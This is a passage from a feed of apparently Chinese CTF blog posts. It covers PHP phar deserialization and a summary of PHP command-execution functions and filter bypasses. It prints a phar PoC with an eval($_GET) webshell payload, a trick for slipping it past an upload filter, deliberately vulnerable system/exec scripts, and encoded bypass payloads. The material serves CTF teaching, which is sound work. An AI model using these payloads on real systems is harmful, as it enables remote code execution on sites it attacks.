class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要自己改动的位置是下面几个部分，需要替换成自己想要的对应数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="例题练习-1"><a href="#例题练习-1" class="headerlink" title="例题练习"></a>例题练习</h2><p>例题直接打开的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后upload.php的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;上传图片文件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;上传&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$allowedExs</span>=<span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span>=<span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/gif&quot;</span></span><br><span class="line">    ||(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/jpeg&quot;</span></span><br><span class="line">    ||(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/jpg&quot;</span></span><br><span class="line">    ||(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/pjpeg&quot;</span></span><br><span class="line">    ||(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/x-png&quot;</span></span><br><span class="line">    ||(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>])==<span class="string">&quot;image/png&quot;</span></span><br><span class="line">    &amp;&amp;(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>])&lt;<span class="number">204800</span></span><br><span class="line">    &amp;&amp;<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowedExs</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件储存在&quot;</span>.<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;mybe hack?&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目在上传的时候有个类型过滤，这里把poc生成的phar修改成png即可。其他的就没啥了，就是上传phar文件然后让第一个页面去加载即可。下面是这道题目的poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250624103623.png"></p>]]></content>
    
    
    <summary type="html">PHP中的类
1
2
3
4
5
6
7
8
9


class Dog
{
    var $name;
    var $species = &quot;dog&quot;;
    function call()
    {
        echo &quot;woof woof&quot;;
    }
}


上面定义了一个Dog类，并且他又两个成员变量，分别是name和species，然后还有一个成员方法call()，可以通过下面代码去创建和使用

1
2
3
4
5
6
7
8


# 创建对象
$dog1 = new Dog();
# 给dog1设置name属性
$dog1-&gt;name = &quot;luck&quot;;
# 调用</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WEB/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="PHP" scheme="https://blog.boychai.xyz/tags/PHP/"/>
    
    <category term="反序列化" scheme="https://blog.boychai.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>WEB-PHP命令执行总结</title>
    <link href="https://blog.boychai.xyz/2025/06/16/WEB-PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <id>https://blog.boychai.xyz/2025/06/16/WEB-PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</id>
    <published>2025-06-16T15:17:00.000Z</published>
    <updated>2025-07-17T05:40:18.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h1><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以直接把命令丢给system，他会直接运行并且输出返回的内容。</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要传入两个参数，一个是命令，一个是执行后的命令回显存放位置，想要看运行结果需要单独的输出。</p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is test!!!&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和system相同，运行直接回显</p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入命令后会返回一个数据，这个数据就是命令执行后的回显，也需要单独输出。</p><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$cmd</span>`,PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行需要手动echo</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入两个变量，第一个是命令，第二个是模式，一般是<code>r</code>和<code>w</code>分别代表读取和写入。底层实际就是开一个现成用来接收数据，函数打开一个进程管道，可以用来执行命令并读取其输出或写入数据。它以文件流的方式处理命令输出，需要手动构造 var_dump() &#x2F; print_r 语句来显示输出。</p><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/tmp/error-output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要传入三个参数，第一个是执行的命令，第二个是参数，然后第三个是调用数组的内容，0表示输入，1表示输出，默认没回显，需要知道即可，不常用。</p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;-c&quot;</span>,<span class="variable">$cmd</span>));</span><br></pre></td></tr></table></figure><p>需要传入两个参数，第一个是二进制文件，第二个是运行参数，然后他需要拥有前置模块才可以用。</p><h1 id="函数限制绕过"><a href="#函数限制绕过" class="headerlink" title="函数限制绕过"></a>函数限制绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/exec|system|popen|proc_open|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是黑客么？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁止了一些函数的使用，命令执行的函数有多种，用其他的命令函数绕过不多说，它还可以用文件包含、还有一些编码绕过base64、urldecode等等，可用payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;syste%256d(%27dir%27);&quot;</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(%<span class="number">22</span>c3lzdGVtKCdkaXInKTs=%<span class="number">22</span>));</span><br></pre></td></tr></table></figure><h1 id="命令拼接绕过"><a href="#命令拼接绕过" class="headerlink" title="命令拼接绕过"></a>命令拼接绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>.<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的这个解法比较简单通过<code>;</code>、<code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>都可以，其实这种的绕过方法还是蛮多的，要注意的是如果要用<code>&amp;</code>的话，需要url编码，因为他是传参的分割符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个相同的，用<code>;</code>和<code>||</code>都可以，其中<code>||</code>的含义是指前面的命令执行成功则就不执行后面的命令</p><h1 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span 